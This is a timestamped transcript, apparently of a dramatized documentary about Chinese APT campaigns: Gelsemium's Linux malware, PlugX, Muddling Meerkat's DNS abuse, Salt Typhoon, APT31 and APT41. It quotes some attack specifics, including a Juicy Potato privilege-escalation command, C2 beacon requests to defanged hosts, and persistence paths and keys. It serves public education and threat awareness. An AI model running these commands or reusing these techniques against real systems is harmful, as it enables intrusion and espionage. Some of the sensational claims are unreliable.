**45:56** · FireWood appeared alongside it. And when researchers analyzed FireWood's code, they found something remarkable. The same "Wood" string from the original 2005 Project Wood. Same file extensions. .k2 and .v2. Same TEA encryption with variable rounds.

**46:14** · FireWood is connected to Project Wood, previously used by Gelsemium in Operation TooHash.

**46:20** · Eighteen years later. Same genetic markers. Same technical DNA.

**46:25** · But running on Linux instead of Windows.

**46:28** · That's what separates professional APT groups from amateur hackers. Amateurs give up when defenses improve. And Gelsemium had just demonstrated they were very professional indeed.

**46:46** · Now let me show you what eighteen years of Linux malware development actually looks like.

**46:52** · Because WolfsBane isn't just another backdoor. The WolfsBane Hider rootkit hooks many basic standard C library functions such as open, stat, readdir, and access.

**47:05** · Every time your Linux system tries to list files, check permissions, or read directories, WolfsBane intercepts the request. It filters the results. Removes any trace of its own existence.

**47:18** · You could be looking directly at an infected directory. Running system commands. Checking processes. And WolfsBane would edit the output in real-time. Making itself disappear from your view.

**47:32** · But that's not all. WolfsBane disables SELinux.

**47:37** · Linux's built-in security system. Then it creates legitimate-looking system services. Files like /lib/systemd/system/display-managerd.service. Services that start automatically when your system boots. Or it modifies .bashrc and .profile. Files that execute every time you log in. So the malware launches itself using your own login process.

**48:01** · FireWood takes a different approach. Kernel-level rootkit. A module called usbdev.ko that operates at the deepest level of your operating system. It communicates through Netlink protocol.

**48:15** · A legitimate Linux communication method. Hiding its traffic among normal system messages.

**48:21** · The configuration file is called kdeinit. Looks like a standard KDE component.

**48:26** · But it's XOR encrypted with key 0x26. Inside are the command and control settings.

**48:34** · Domains like asidomain\[.\]com. Connection schedules and different controls.

**48:40** · When WolfsBane needs to execute commands from its handlers, it uses encrypted libraries. LibUdp.so and libHttps.so. RC4 encryption for all updates and communications.

**48:59** · This is software engineering. Built by professionals who understand Linux internals better than any dev. And remember, this is their first-generation Linux malware. Built by a group that spent eighteen years perfecting Windows exploitation.

**49:17** · Now imagine what their second generation will look like.

**49:26** · Here's what you need to understand about this story.

**49:30** · It's not over. While researchers were analyzing WolfsBane samples from 2023, Gelsemium was already running active operations across Southeast Asia.

**49:40** · In 2022 and 2023, they targeted a Southeast Asian government. Six months of sustained access. Web shells, OwlProxy, and SessionManager backdoors collecting intelligence from IIS servers.

**49:57** · The login.jsp is a modified AntSword JSP webshell that executes Java bytecode from attackers.

**50:04** · Login.jsp. Yy1.jsp.

**50:04** · A.jsp. Web shells with names designed to look like standard web components. Each one capable of remote control, file operations, and database access. They're using a trojanized OpenSSH client as an SSH password stealer. Credentials get stored in this folder I'm showing you here. /tmp/zijtkldse.tmp. Perfect for lateral movement across compromised networks. A privilege escalation tool called 'ccc' maintains elevated privileges using setuid and setgid. Simple name. Devastating capability.

**50:36** · The web shells execute Java bytecode and SQL queries.

**50:40** · Payloads encoded or encrypted with AES. Key 6438B9BD2AB3C40A.

**50:43** · \[mini section break\] From Project Wood in 2005 to WolfsBane in 2023.

**50:49** · Same adversaries. Same persistence. Same observations of long-term espionage.

**50:56** · The Linux malware samples on VirusTotal weren't the end of this story.

**51:00** · They were the beginning of the next story. Subscribe if you want to hear it.

### For fifteen years, this malware has been evolving.

**51:15** · What if I told you that Norton Antivirus and Kaspersky - the very software protecting millions of computers - could be turned into cyber weapons? This isn't science fiction. This is PlugX, and it's been perfecting this trick since 2008. You see, PlugX is what we call a RAT - a Remote Access Trojan. That means once it gets on your machine, someone else has complete control. They can execute commands, steal your files, log every keystroke you make, and manage your entire system from anywhere in the world. The brilliance is in the design.

**51:46** · PlugX isn't just one piece of malware - it's modular. The attackers can add new capabilities on demand, like building blocks. Need to steal passwords? Load the keylogger module. Want to grab files?

**51:49** · Deploy the data exfiltration component. Everything gets logged to innocent-looking text files buried in your temp directories. For fifteen years, this malware has been evolving, adapting, and spreading. So without further ado, let me take you right to the beginning of this true cyber crime documentary.

**52:10** · 2014. A Japanese engineer at a high-tech manufacturing firm opens what looks like a legitimate PDF document. The cursor blinks normally. The screen shows familiar icons. But hidden beneath, something else is happening.

**52:25** · Within milliseconds, a piece of malware called Sysget sends this exact HTTP request: GET /index\[.\]php?fn=s4&amp;name=4890c2d546fa48a536b75b48b17de023 to biosnews\[.\]info. That long string of characters? That's how the malware identifies this specific infected machine. Unique ID.

**52:47** · This was DragonOK's systematic targeting of Japanese high-tech and manufacturing firms.

**52:53** · They didn't just use PlugX - they built an entire ecosystem around it. Sysget, also known as HelloBridge. NFlog. PoisonIvy. FormerFirstRAT. Each piece of malware had a specific job, but they all worked together like instruments in an orchestra.

**53:13** · The technical sophistication was remarkable. When Sysget received responses from the C2 server, it decrypted them using RC4 encryption. The process works like this: the malware takes a base key and derives a unique encryption key for each communication session.

**53:30** · Every byte of stolen data gets scrambled using this key before it travels across the internet to Chinese servers. Palo Alto Networks' Unit 42 team identified what they called a "new backdoor malware" - FormerFirstRAT. But it wasn't really new. It was part of DragonOK's expanding arsenal, all centered around PlugX's core capabilities.

**53:53** · Corporate secrets flowed out of Japan for months before anyone noticed.

**54:03** · 2017 brought geographic expansion. Taiwan, Tibet, Russia - DragonOK's scope broadened dramatically. But more concerning was how they were getting in. They'd moved beyond simple phishing emails to exploiting a specific vulnerability: CVE-2015-1641.

**54:23** · This is a memory corruption flaw in Microsoft Office. When you open a malicious RTF file - which looks like any normal document - the vulnerability lets attackers take complete control of your system. The RTF file appears innocent, but embedded within lies shellcode that dynamically loads Windows APIs and decrypts payloads using XOR logic.

**54:49** · In this context, XOR decryption processes data in 4-byte windows.

**54:54** · It takes each window, applies an iterative key that cycles through different values, but preserves null bytes to avoid breaking the code. It's elegant and effective.

**55:05** · The researchers observed two primary attack methods: direct executable attachments in phishing emails, and these malicious RTF files exploiting CVE-2015-1641.

**55:22** · The shellcode was particularly clever - instead of hardcoding API calls that security software might detect, it dynamically loaded them at runtime. Updated versions of Sysget, IsSpace, TidePool, and PlugX all worked together in these campaigns. Each tool had enhanced stealth capabilities, but the espionage was becoming clear to security researchers worldwide.

**55:50** · But attribution would soon blur in ways no one expected.

**56:00** · When ESET researchers detected a backdoor in 2018, they initially classified the attack as coming from OceanLotus - also known as APT32, a Vietnamese threat group.

**56:13** · The problem? It wasn’t PlugX. OceanLotus had deployed a two-stage attack using a signed executable and malicious DLL, perfectly mirroring PlugX's DLL side-loading methods.

**56:24** · The backdoor that got the name Korplug was later confirmed to be a PlugX variant.

**56:30** · Anyway, that technique they both use is truly insidious. DLL side-loading.

**56:36** · Your legitimate software - Norton, Kaspersky, even Windows itself - relies on these things called Dynamic Link Libraries, or DLLs.

**56:48** · Think of them as instruction manuals that tell programs how to do specific tasks.

**56:53** · PlugX creates fake versions of these instruction manuals. When your trusted antivirus software starts up, it accidentally loads PlugX's malicious DLL instead of the real one.

**57:04** · Your antivirus thinks it's protecting you. In reality, it's running the very malware it's supposed to stop. The fundamental issue was TTPs - Tactics, Techniques, and Procedures. Different hackers were using identical techniques.

**57:12** · DLL side-loading, specific C2 communication patterns, even the same anti-analysis tricks - they'd all become common knowledge among advanced persistent threat groups. Basically the toolset used by the adversary makes it difficult to attribute the attacks to a particular group. When different groups use the same methods, how do you tell them apart?

**57:33** · But while the security community grappled with attribution confusion, the attackers themselves were preparing for something much bigger. Bigger targets awaited.

**57:33** · 2020. Australian government agencies and major businesses faced the worst.

**57:38** · This was PlugX weaponized with privilege escalation tools that turned Windows' own security features against itself. The Australian Cyber Security Centre issued Advisory 2020-008. State-sponsored attackers had penetrated critical infrastructure using a vulnerability that most organizations didn't even know existed: CVE-2019-18935.

**58:06** · This is a deserialization flaw in Telerik UI - web development software used by thousands of companies worldwide. When a web application processes data using Telerik UI, the vulnerability lets attackers inject malicious code directly into the server's memory. The attackers targeted public-facing infrastructure specifically because these systems were exposed to the internet and often contained unpatched versions of Telerik UI. But the real hack came after initial access.

**58:28** · The attackers deployed something called Juicy Potato - a privilege escalation tool that exploits SeImpersonatePrivilege. This Windows feature is supposed to let certain processes act on behalf of other users for legitimate administrative tasks. Juicy Potato turns this security feature into a weapon. The command was simple but devastating: JuicyPotato.exe -l 1337 -p cmd.exe -t \* That asterisk means "target any available token."

**59:01** · In Windows, tokens are like security badges that tell the system what permissions a user or process has. Juicy Potato steals these tokens from privileged processes and uses them to gain complete administrative control. The attackers went from limited web server access to full system control in minutes. They also deployed PowerShell Empire - a post-exploitation framework that's catalogued in the MITRE ATT&amp;CK database as T1059.001.

**59:32** · The tool lets attackers execute commands, move through networks, and maintain persistent access while looking like legitimate administrative activity.

**59:35** · Web shells like HighShell ensured the attackers could return whenever they wanted. These are essentially backdoors disguised as normal web files. To any security monitoring, they look like regular website components. But they give attackers permanent remote access to the compromised systems. Throughout all of this, PlugX indicators of compromise confirmed its central role. The same DLL side-loading techniques. The same modular architecture But thing is, the attackers focused on reconnaissance while avoiding disruption tactics. They weren't trying to break things or cause chaos. They were quietly mapping networks, identifying valuable data, and establishing long-term access for intelligence gathering.

**59:58** · You might think the Australian attacks were the end of the story. They weren't.

**1:00:03** · One thing I didn’t tell you yet. PlugX checks if you're watching it watch you.

**1:00:08** · The malware uses something called IsDebuggerPresent - a Windows API call that's supposed to help legitimate software detect debugging tools. But PlugX weaponizes it.

**1:00:20** · Before executing its malicious code, it calls IsDebuggerPresent to check if security researchers are analyzing it in a controlled environment. If it detects a debugger, it goes dormant.

**1:00:35** · It plays dead until the researchers give up and move on.

**1:00:38** · This is just one of dozens of anti-analysis tricks built into modern PlugX variants. The malware actively fights back against detection attempts.

**1:00:49** · Communication protocols have evolved too. Early PlugX variants used simple HTTP requests with RC4 encryption - the same encryption we saw in those 2014 Japanese attacks.

**1:01:01** · Modern variants implement AES-256-CBC encryption for their C2 communication. That's military-grade encryption, the same standard used to protect classified government data.

**1:01:14** · AES-256-CBC is virtually unbreakable with current technology. When security tools try to inspect PlugX traffic, they see perfectly encrypted data that reveals nothing about the malware's activities. It’s modular design creates persistence that goes beyond just staying on one machine. Each plugin operates independently.

**1:01:36** · Security teams might detect and remove one component while missing three others that are quietly maintaining access through different channels.

**1:01:42** · The malware communicates through both HTTP and HTTPS depending on the variant and target environment. Some versions masquerade as legitimate web traffic, hiding their C2 communication in what looks like normal browsing activity.

**1:02:02** · Your computer right now might be running a legitimate application - one you trust - while PlugX puppeteers your system through DLL side-loading.

**1:02:12** · This is the reality we live with today. Modern PlugX variants communicate with their C2 servers using requests that look like this: POST /update?id=12345 HTTP/1.1 to malicious\[.\]com with Content-Length: 128. Once active on a system, PlugX executes commands through cmd.exe, captures everything on your screen, logs every keystroke you make, manages running processes, and quietly exfiltrates your data.

**1:02:38** · How many systems worldwide are running PlugX right now? The honest answer is nobody knows.

**1:02:46** · Every time you see Norton Antivirus protecting your system, remember that the same executable could be loading malicious code through DLL side-loading.

**1:02:55** · Every time you trust a signed application or a familiar process, remember that PlugX has spent fifteen years perfecting the art of hiding in plain sight.

**1:03:04** · PlugX remains a brutal advanced persistent threat because it solved the hardest problem in cybersecurity: how to maintain long-term access to systems without being detected.

### You know about China's Great Firewall, right?

**1:03:15** · You wake up, check your email, browse the web, stream a video. Every click depends on something you never think about.

**1:03:31** · DNS. The Domain Name System. It's the phone book of the internet. When you type a website name, DNS translates it into the IP address your computer actually needs. Without it, the internet doesn't work.

**1:03:44** · It's invisible. It's trusted. And for over five years now, someone's been quietly manipulating it.

**1:03:51** · October 2019. That's when it started. They targeted super-aged domains.

**1:03:57** · Websites registered before the year 2000. These attackers weren't going after your personal computer. They were mapping the internet's foundational infrastructure.

**1:04:07** · Every DNS query they sent was reconnaissance. Testing responses.

**1:04:13** · Learning how global networks route information. MX records became their weapon of choice.

**1:04:19** · Mail exchange records that tell the internet where to send email for any domain.

**1:04:24** · Sounds boring, right? But control email routing, and you control communication channels. You can intercept, redirect, or poison the entire system.

**1:04:34** · A long-term global campaign that we call Muddling Meerkat. But back then, nobody knew.

**1:04:44** · You know about China's Great Firewall, right? That massive censorship system that blocks websites and controls what Chinese citizens can see online. It's purely defensive. At least, that's what everyone thought. Muddling Meerkat weren't just manipulating DNS records. They were weaponizing the Great Firewall itself.

**1:05:03** · Think about this for a second. The same infrastructure China uses to censor the internet was being turned into an offensive cyber weapon. The Great Firewall acts as an operator on the side. When you make a DNS request, it's supposed to go to the authoritative server and come back with the real answer. But the GFW can inject its own answers into those DNS responses.

**1:05:24** · Fake answers. False MX records pointing wherever they want your email to go.

**1:05:28** · This technique had never been reported before.

**1:05:30** · If those false responses get cached by DNS servers around the world? You've just poisoned the global internet's phone book. They turned censorship infrastructure into a weapon. You’re about to see it so don’t go anywhere.

**1:05:45** · September 2023. Four years after the initial campaign started, something changed.

**1:05:51** · The activity spiked. Hard. Large volumes of widely distributed DNS queries started flooding through open resolvers across the globe.

**1:05:59** · Open resolvers are DNS servers that anyone on the internet can use. They're supposed to be helpful - public DNS services that respond to queries from anywhere. But Muddling Meerkat was exploiting them.

**1:06:10** · When you use an open resolver, the query appears to come from that server, not from you. It's perfect for hiding your true location and identity.

**1:06:18** · Muddling Meerkat was leveraging hundreds of these servers worldwide.

**1:06:22** · Each query looked like it was coming from a different place.

**1:06:24** · A perfect global distribution strategy to mask where the reconnaissance was really originating.

**1:06:31** · The volume was a lot. And Cybersecurity researchers started seeing the patterns.

**1:06:36** · The questions started flying. What were they mapping? What were they preparing for?

**1:06:42** · Years of quiet reconnaissance suddenly becoming this massive, distributed operation meant one thing. They were getting ready to use everything they'd learned. But for what?

**1:06:55** · December 2023. Three months after that massive spike in activity, someone finally started connecting the dots.

**1:07:03** · Dr. Renée Burton and her threat intelligence team at Infoblox. These are the DNS experts. If anyone was going to figure out what Muddling Meerkat was really doing, it would be them.

**1:07:14** · They started analyzing the patterns. All those DNS queries flooding through open resolvers? They weren't random. The queries were hitting old, random subdomains. Often subdomains that didn't even exist. You'd see requests for things like "xyz123\[.\]old-domain\[.\]com" where xyz123 was just made up.

**1:07:36** · At first glance, it looked like a Slow Drip DDoS attack. That's when attackers send low-volume requests to overwhelm a target gradually, staying under detection thresholds.

**1:07:44** · But Burton's team realized something crucial. These weren't trying to overwhelm anything. They were testing network responses. Pure reconnaissance.

**1:07:53** · Each query was like a ping. Sending out a signal and seeing what came back. How does this network respond? What paths does the traffic take? Where are the chokepoints?

**1:08:02** · And then Burton's team made the breakthrough discovery that changed everything.

**1:08:09** · January 2025. Burton's team made the connection that shattered everything we thought we knew about Muddling Meerkat. All that sophisticated DNS reconnaissance?

**1:08:20** · All those years of mapping global internet infrastructure using the Great Firewall?

**1:08:24** · It was suddenly used for spam campaigns. The researchers started finding the connections.

**1:08:31** · QR code phishing emails targeting Chinese citizens. PDF attachments that looked legitimate, but when you scanned the QR code, it redirected you through WeChat to fake websites designed to steal your credentials.

**1:08:45** · Cryptocurrency extortion campaigns. Threatening emails demanding ransom payments. "We have your sensitive data. Pay us in Bitcoin or we release everything."

**1:08:56** · But here's where it gets personal for you. Japanese brand impersonation. Fake Amazon login pages. Fake banking websites for major Japanese banks. Perfect replicas designed to steal your username, password, and banking credentials the moment you typed them in.

**1:09:10** · Years of DNS infrastructure mapping had given them the perfect blueprint for large-scale phishing operations. They knew exactly which domains to spoof, which mail servers to target, and how to route their malicious traffic to avoid detection.

**1:09:30** · As researchers dug deeper, they found more mysterious financial spam originating from China. Spreadsheet attachments from freight companies with unclear motives.

**1:09:41** · The operation was bigger and stranger than anyone had imagined.

**1:09:44** · When your security system sees a DNS query for a domain registered in 1997, it doesn't throw up red flags. It looks completely normal. That's 25+ years of established internet presence. Their approach meant that traditional security tools were basically useless. The internet's phone book had been compromised for over five years. And this was just what we’d found so far.

**1:10:08** · Here's what's really unsettling. Muddling Meerkat isn't alone.

**1:10:13** · You've got actors like “Decoy Dog” and “VexTrio Viper” operating in the same space. Different groups, similar capabilities. This isn't one rogue operation. It's an organized threat landscape where state-sponsored groups are sharing techniques and infrastructure.

**1:10:29** · When attackers use legitimate domains registered before modern security existed, when they route their traffic through censorship infrastructure, when they blend reconnaissance with normal internet activity, you need new approaches.

### Two names you need to know: FamousSparrow and Redfly.

**1:11:02** · Two names you need to know: FamousSparrow and Redfly.

**1:11:06** · While you're scrolling through your phone, charging it from the wall, these groups are already deep inside the power grids that keep your lights on.

**1:11:13** · They're listening to the data flowing through AT&amp;T and Verizon networks—the same networks carrying your calls, your texts, your life. Here's what makes them dangerous.

**1:11:24** · They don't smash windows to get in. They use what we call zero-day vulnerabilities—security holes that software companies don't even know exist yet. Think of it like having a master key to every lock in the city, except the locksmiths have no idea someone copied their keys.

**1:11:38** · These hackers craft custom backdoors, secret entrances they build into systems that let them walk back in anytime they want, completely undetected.

**1:11:48** · While FamousSparrow and Redfly are moving through critical infrastructure like smoke, cybersecurity firms ESET and Symantec are racing against time.

**1:12:00** · They're tracking digital footprints, analyzing malware samples, trying to understand attacks.

**1:12:15** · July 2024. FamousSparrow makes their first move. They hit three targets across two continents.

**1:12:23** · A US trade group, a Mexican research institute, and the Honduran government.

**1:12:29** · A researcher in Mexico found his life's work vanishing overnight—stolen by unseen hands.

**1:12:36** · Years of data, research that could've changed industries, gone. But that's just what he could see. What he couldn't see was worse. FamousSparrow had planted something called SparrowDoor in his systems. It’s a backdoor, and lets hackers control everything—quietly.

**1:13:00** · They used something called RC4 encryption to scramble their communications, talking to three different command and control servers, including one at IP address 43\[.\]254\[.\]216\[.\]195.

**1:13:17** · But they needed to get in first. That's where ProxyLogon comes in—a vulnerability tagged CVE-2021-26855. Microsoft patched this flaw in their Exchange servers years ago, but these organizations? They never updated. FamousSparrow walked through that unpatched door like it was standing wide open. Once inside, they deployed ShadowPad malware. They loaded it through a file called imjpp14.dll, then injected it straight into Windows Media Player—wmplayer.exe.

**1:13:54** · They even used a fake Dell security certificate to make it look legitimate. The certificate hash was BAED2895C80EB6E827A6D47C3DD7B8EFB61ED70B.

**1:14:04** · To your computer, this malware looked like trusted Dell software.

**1:14:08** · Then came BadPotato—an exploit that elevates their access from regular user to system administrator.

**1:14:14** · Full control. Total domination. They left traps for round two.

**1:14:19** · FamousSparrow was just getting started. \[mini section break\] Six months earlier, in February 2023, while you were going about your daily life, another group called Redfly was already deep inside an Asian power grid. Six months undetected—living inside the grid like a ghost. Picture the control room of a power plant. Hear the constant hum of massive generators, smell the ozone from high-voltage equipment, feel the weight of knowing that millions of people depend on these systems working perfectly.

**1:14:50** · Now imagine someone else has been watching every switch, every command, every password for half a year.

**1:15:02** · Redfly used ShadowPad too, but they hid it inside fake VMware files. VMware is software that runs virtual machines—computers inside computers. System administrators see VMware services running all the time, so Redfly's malware blended in perfectly. They used something called Packerloader with AES encryption to package their code, making it invisible to antivirus software.

**1:15:27** · They deployed a tool called ProcDump to extract LSASS memory.

**1:15:32** · LSASS—the Local Security Authority Subsystem Service—stores login credentials in Windows.

**1:15:37** · When you type your password, LSASS holds it in memory.

**1:15:42** · ProcDump vacuums up that memory, stealing admin passwords for lateral movement through the network. For six months, they erased Windows security event logs every night, covering their tracks like janitors. They installed keyloggers to capture every keystroke operators made—passwords, commands, everything needed to potentially sabotage the grid. But the craziest attack was yet to come.

**1:16:16** · By March 2025, engineers at AT&amp;T and Verizon made a chilling discovery.

**1:16:23** · Hackers had been inside their wiretapping systems for months. Not just any hackers—a group called Salt Typhoon, linked directly to FamousSparrow. A Verizon engineer saw the breach unfold—too late to stop it. Just imagine that. Endless rows of servers in climate-controlled data centers, buzzing with the secrets of millions of Americans, now wide open to foreign eyes.

**1:16:49** · Salt Typhoon had targeted the court-authorized wiretap infrastructure. These are the systems law enforcement uses with warrants to monitor criminal communications. They accessed call metadata—who called who, when, for how long—and actual communications content.

**1:17:07** · They used a zero-day vulnerability in Ivanti Connect Secure, designated CVE-2023-46805. Zero-day means the software company didn't know the flaw existed when attackers started using it. It's like finding out someone's been using a secret entrance to your house that you didn't know existed. The hackers collected massive amounts of metadata from Washington, D.C., specifically targeting political figures.

**1:17:37** · They used living-off-the-land techniques—legitimate system tools like rar.exe to compress stolen data, blending their activities with normal network traffic. They could've tapped millions of calls. Every private conversation, every sensitive negotiation, every secret that flows through America's telecommunications backbone—all potentially compromised.

**1:18:06** · But there was something connecting all of these groups.

**1:18:19** · These are Chinese state-sponsored hackers, and they're everywhere.

**1:18:24** · From power grids to your phone. You've been watching what you thought were separate attacks. Different groups, different targets, different times.

**1:18:36** · But there's been one constant thread weaving through every single breach—ShadowPad malware.

**1:18:43** · The same exact code showing up in FamousSparrow's attack on that Mexican researcher, in Redfly's infiltration of the Asian power grid, and in Salt Typhoon's penetration of American telecoms. Microsoft confirmed it.

**1:18:58** · Salt Typhoon isn't just some random hacking collective. They're directly tied to China's Ministry of State Security—the MSS. That's China's intelligence agency, their CIA.

**1:19:12** · This isn't cybercrime anymore. This is espionage. This is warfare.

**1:19:16** · ShadowPad's shared use across all these groups reveals something chilling—there's a quartermaster arming these hackers. Someone is building malware in a centralized location and handing it out like military supplies. You think you've been watching three separate stories, but you've actually been watching one massive operation unfold across years.

**1:19:37** · Since 2019, these groups have been hitting telecoms across the United States, the Philippines, Malaysia, and Taiwan. Not random targets—strategic ones.

**1:19:50** · Countries and regions that matter to China's geopolitical interests.

**1:19:54** · Their goal isn't money. It's intelligence. High-value data. Political campaign communications. Government secrets. Corporate strategies. Everything needed to stay three steps ahead in global competition. They've been building a detailed picture of how your country works, where the weak points are, and how to exploit them when needed. Every backdoor they've installed, every system they've mapped, every credential they've stolen—it's all part of a larger strategic intelligence operation.

**1:20:27** · This changes everything about how you should think about cybersecurity. Every device you use, every network you connect to, they're all potential targets. You just didn't know that yet.

**1:20:50** · AT&amp;T and Verizon claimed they evicted the hackers by January 2025. They brought in teams of cybersecurity experts, rebuilt compromised systems, changed credentials, and sealed the entry points. But how many other ISPs are still infected? How many systems still have Chinese state-sponsored malware sleeping inside them, waiting for the next command? The FBI launched a massive investigation to unmask Salt Typhoon. They've got the best cyber investigators in the world working around the clock. By March 2025—no arrests. No names. No faces. The hackers vanished.

**1:21:31** · Thing is, Salt Typhoon uses GRE tunnels for data exfiltration—Generic Routing Encapsulation tunnels. To network monitors, it looks like regular business communications. In reality, it's gigabytes of sensitive information flowing out to command centers in China.

**1:21:48** · The truth is haunting: they're still out there, and they're still active.

**1:22:04** · That phone in your hand? It's a target. You just watched Chinese state-sponsored hackers penetrate power grids, telecommunications networks, and government systems.

**1:22:12** · But the story doesn't end with their arrests, because there weren't any arrests.

**1:22:17** · The story ends with a sobering reality: the same vulnerabilities they exploited are still out there, waiting. Ninety-one percent of Microsoft Exchange servers worldwide remain unpatched for ProxyLogon—the same CVE-2021-26855 vulnerability that FamousSparrow used to break into that Mexican research institute.

**1:22:41** · Three years after Microsoft released the fix, most organizations still haven't applied it. Every one of those servers is an open door. Cisco devices across the globe are still vulnerable to CVE-2023-20198. This flaw lets attackers take complete remote control of network equipment. Millions of devices are infected with stealth malware like Demodex rootkits. Rootkits hide deep in your operating system, below where antivirus software can see them.

**1:23:14** · They're like parasites, invisible to the host but feeding information back to their masters. Your computer could be part of a Chinese intelligence network right now, and you'd never know.

**1:23:33** · These hackers don't care about you personally. They don't want your credit card number or your social media passwords. Stick to providers like ProtonMail if you want to keep your emails private. Link in the description below.

### You think you know cyber warfare? You don't know APT31.

**1:23:52** · China's hidden hackers have been inside your world since 2010.

**1:23:56** · There's a tech company in Wuhan called Xiaoruizhi Science and Technology. Sounds legit, right?

**1:24:02** · Clean website. Professional address in Hubei Province. They're selling software solutions.

**1:24:08** · Except they're not selling anything. This company? It's a front. A mask for something much darker lurking underneath. While you've been living your life, checking emails, running businesses, these guys have been hunting. Government officials. Power grids. Critical infrastructure that keeps your lights on and your world spinning.

**1:24:30** · You think you know cyber warfare? You don't know APT31.

**1:24:35** · They've been targeting U.S. and international entities for over a decade. Not script kiddies in their mom's basement. Not random criminals looking for quick cash.

**1:24:44** · This is something else entirely. You're about to see how a fake tech company in China built one of the most sophisticated cyber espionage operations the world has ever seen. The rabbit hole goes deeper than you think.

**1:25:06** · A cybersecurity researcher stares at his screen. His jaw drops.

**1:25:10** · He's found something called Jian. It's a perfect clone of an NSA exploit called EpMe. APT31 built it to hit a zero-day vulnerability in Windows. CVE-2017-2005.

**1:25:27** · "They're better than we thought," he mutters. Zero-day exploits are software flaws that nobody knows about yet. No patches. No fixes. Just wide-open doors into your system. Jian was designed to walk through that door before Microsoft even knew it existed.

**1:25:45** · They didn't patch CVE-2017-2005 until March 2017. APT31 was already inside, copying NSA tools and making them their own. But that's just the beginning.

**1:26:01** · --- 2018. Texas energy company.

**1:26:05** · An energy worker opens what looks like a normal email. Standard corporate stuff.

**1:26:10** · Nothing suspicious. He clicks.

**1:26:13** · This is spear phishing - fake emails crafted specifically to trick you. Not random spam. Targeted psychological warfare. They studied this company.

**1:26:23** · They knew exactly what email would get clicked. Now the hackers are in the system. The malware is already spreading through the power grid infrastructure. APT31 just demonstrated they can mess with the lights that keep your world running. --- 2020. U.S. Naval Academy. An IT admin notices weird network traffic.

**1:26:45** · Unusual patterns. Data flowing where it shouldn't. "We're under attack," he says, tracing the source.

**1:26:53** · Spear phishing emails again. But these contain tracking links - invisible pixels that phone home when opened. They're gathering device information, network details, mapping the entire Naval Academy's digital infrastructure. The emails connect to cloud services for command-and-control. C2 operations let hackers remote-control infected systems from anywhere in the world. Clean. Untraceable. Professional. They're using malware called MeatBall. It enables remote access and data gathering. APT31 isn't just stealing files - they're taking complete control.

**1:27:33** · Military secrets. Naval operations. Strategic intelligence.

**1:27:38** · They're hunting the crown jewels of American defense.

**1:27:42** · The sophistication is staggering. These aren't random criminals. This is warfare.

**1:27:54** · 2021. The year everything changed. APT31 unleashes hell on Microsoft Exchange servers worldwide. They found four vulnerabilities shown on screen here. CVE-2021-26855. CVE-2021-26857. CVE-2021-26858. CVE-2021-27065. Four holes in Microsoft's email infrastructure that nobody saw coming.

**1:28:10** · These aren't just any servers. These are the hearts of businesses. Corporate communications.

**1:28:17** · Government emails. Financial transactions. Everything that keeps the modern world spinning.

**1:28:25** · APT31 tears through them like paper. 250,000 servers compromised. Backdoors planted in every single one. Let that sink in for a second.

**1:28:37** · Quarter of a million servers. Businesses. Governments. Organizations you trust with your data. All of them infiltrated simultaneously in a coordinated global assault.

**1:28:49** · Across the globe, security operations centers light up with alerts. But here's the thing about massive cyber attacks - they don't announce themselves with flashing signs that say "you're being hacked by a nation-state."

**1:29:02** · It starts as noise. Unusual network traffic. Suspicious file modifications. Authentication anomalies. The same kinds of alerts security teams see every day. Most turn out to be false positives. Until they don't.

**1:29:19** · The investigation reveals the scope. The backdoors. The coordinated timing. The sophistication that points to something much bigger than random cybercriminals.

**1:29:29** · APT31 isn't just some random hacker group. They're not independent criminals looking for quick cash.

**1:29:37** · They're working for China's Ministry of State Security. The MSS. China's intelligence agency.

**1:29:42** · This entire operation - from the NSA tool cloning to the power grid infiltrations to this massive Exchange attack - it's all been state-sponsored cyber warfare.

**1:29:52** · You've been watching a nation-state in action. A government using hackers as internet soldiers to steal secrets and gather intelligence. That fake tech company in Wuhan? That's how a superpower wages war in the 21st century. 250,000 backdoors. All controlled by Beijing.

**1:30:15** · March 2024. The United States fights back and seven Chinese nationals linked to APT31 get hit with federal charges.

**1:30:24** · Fourteen years of cyber espionage laid out in black and white. Names. Faces. Specific crimes spanning more than a decade. SEE PHOTOS HERE https://rewardsforjustice.net/rewards/apt31-wuhan-xiaoruizhi-science-technology-company-ltd/ The indictments detail everything. The fake tech company. The stolen NSA tools. The power grid attacks. The military infiltrations. The Microsoft Exchange massacre.

**1:30:44** · It's all there in the court documents. A roadmap of online destruction that traces back to their office building in Wuhan. But here's the problem.

**1:30:53** · These seven hackers? They're still out there. Still free. Still operating from the safety of Chinese soil where U.S. law enforcement can't touch them.

**1:31:03** · The charges are symbolic. A statement. A line in the sand. But they're also meaningless.

**1:31:10** · You can't arrest someone who's protected by a nation-state. You can't extradite hackers when their own government is their employer. The Ministry of State Security isn't going to hand over their cyber soldiers.

**1:31:22** · Intelligence agencies know who they are. They have their real names now.

**1:31:26** · Their methods. Their patterns. But knowing and catching are two very different things.

**1:31:34** · These hackers have been exposed, but they haven't been stopped.

**1:31:40** · The infrastructure they built over fourteen years? Still operational.

**1:31:44** · The backdoors they planted? Still active. The intelligence-gathering apparatus they constructed? Still humming along. APT31 isn't going anywhere.

**1:32:01** · May 28, 2025. The Czech Republic drops the hammer. APT31 hit their Ministry of Foreign Affairs back in 2022. Compromised their unclassified networks. Now it's official. The Czech Republic formally attributes the attack to APT31. The European Union backs them. NATO backs them.

**1:32:30** · Another nation pointing the finger at the same group of hackers operating from that fake tech company in Wuhan. It's not just about China versus the West.

**1:32:39** · APT31 is hitting everyone. Governments across the globe.

**1:32:45** · Your networks aren't safe. Your data isn't secure.

**1:32:49** · These guys have been inside systems for over fifteen years. They've stolen NSA tools. They've infiltrated power grids. They've backdoored quarter of a million servers. They've attacked naval academies and foreign ministries. And they're still out there.

**1:33:05** · Still hunting. Still stealing. Still operating under the protection of a nation-state.

### We just found malware called ToughProgress.

**1:33:25** · We just found malware called ToughProgress.

**1:33:28** · They popped government websites to host malware targeting other government entities.

**1:33:33** · A trusted government domain, the kind you recognise instantly as safe, serving malware to other government systems. Behind this operation? APT41. A sophisticated Chinese threat group that's been operating for years.

**1:33:46** · But APT41’s attacks were staying hidden. Modern cybersecurity tools monitor network traffic. They watch for suspicious communications between infected computers and attacker servers.

**1:33:56** · This communication channel is called command-and-control, or C2 for short.

**1:34:00** · When malware needs instructions from its operators, it reaches out to a C2 server.

**1:34:07** · Security teams hunt for these communications. They're usually the first sign that something's wrong. Yet APT41's ToughProgress malware was slipping past these defenses. Infected systems were communicating with their handlers, but security tools weren't catching it. The question that haunted me is simple: How?

**1:34:24** · How do you hide malware communications in plain sight?

**1:34:30** · ToughProgresses initial infection process was elegant.

